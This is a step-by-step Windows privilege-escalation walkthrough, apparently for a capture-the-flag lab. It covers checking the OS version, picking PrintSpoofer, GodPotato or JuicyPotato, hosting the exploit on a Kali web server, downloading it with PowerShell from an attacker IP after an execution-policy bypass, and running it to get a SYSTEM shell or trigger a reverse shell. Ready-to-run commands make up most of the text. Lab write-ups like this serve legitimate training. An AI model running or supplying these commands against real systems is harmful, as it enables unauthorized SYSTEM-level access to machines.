## Step 1: Verify Your Architecture & OS Version

Before dropping a payload, you need to know whether the target is 32-bit or 64-bit, and roughly how old it is, so you pick the right exploit binary.

Run these two commands in your shell:

DOS

```
powershell [Environment]::Is64BitOperatingSystem
```

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

## Step 2: Choose Your Exploit Tool

Depending on the Windows version you discovered in Step 1, select your tool from the **"Potato" family**:

### Option A: Modern Windows (Windows 10/11, Server 2016/2019/2022)

- **Tool:** **`PrintSpoofer.exe`** or **`GodPotato.exe`**
    
- **Why:** Older potato exploits rely on the NTLM authentication provider against the BITS service, which Microsoft patched. `PrintSpoofer` leverages the Print Spooler service via named pipes, which is highly reliable on modern operating systems.
    

### Option B: Legacy Windows (Windows 7/8, Server 2008/2012)

- **Tool:** **`JuicyPotato.exe`** or **`SweetPotato.exe`**
    
- **Why:** These abuse the classic COM/RPC configuration vulnerabilities present in older Windows builds.
    

## Step 3: Transfer the Exploit to the Target

Use your Kali machine to host the binary, and pull it down via your active Windows shell using PowerShell's native file transfer capabilities.

1. **On your Kali Machine:** (Navigate to where your exploit is stored and start a web server)
    
    Bash
    
    ```
    python3 -m http.server 80
    ```
    
2. **On the Target Windows Machine:** (Download the binary to a writable directory like `C:\Windows\Tasks` or `C:\Users\Public`)
    
    PowerShell
    
    ```
    powershell -ep bypass
    iwr -uri http://<YOUR_KALI_IP>/PrintSpoofer64.exe -OutFile C:\Windows\Tasks\PrintSpoofer.exe
    ```
    

## Step 4: Execute and Escalate

### If using PrintSpoofer:

`PrintSpoofer` is incredibly elegant because it can interactively elevate your existing shell without needing a separate listener.

Run the following command to instantly upgrade your session:

DOS

```
C:\Windows\Tasks\PrintSpoofer.exe -i -c cmd
```

- `-i` instructs the tool to interact with the current session.
    
- `-c cmd` specifies the command interpreter to launch.
    

### If using GodPotato / JuicyPotato:

If you are using a variation that requires triggering a reverse shell back to you, generate an unencoded payload or executable using `msfvenom` or a simple PowerShell one-liner, start a second Netcat listener on Kali, and run:

DOS

```
C:\Windows\Tasks\GodPotato.exe -cmd "C:\Windows\Tasks\reverse_shell.exe"
```

## Step 5: Verify Your Sovereignty

If the exploit succeeds, your prompt will look exactly the same, but your privileges will have changed entirely. Type the following command to confirm your success:

DOS

```
whoami
```

> **Expected Output:** `nt authority\system`

You can now navigate straight to `C:\Users\Administrator\Desktop` to collect your flag.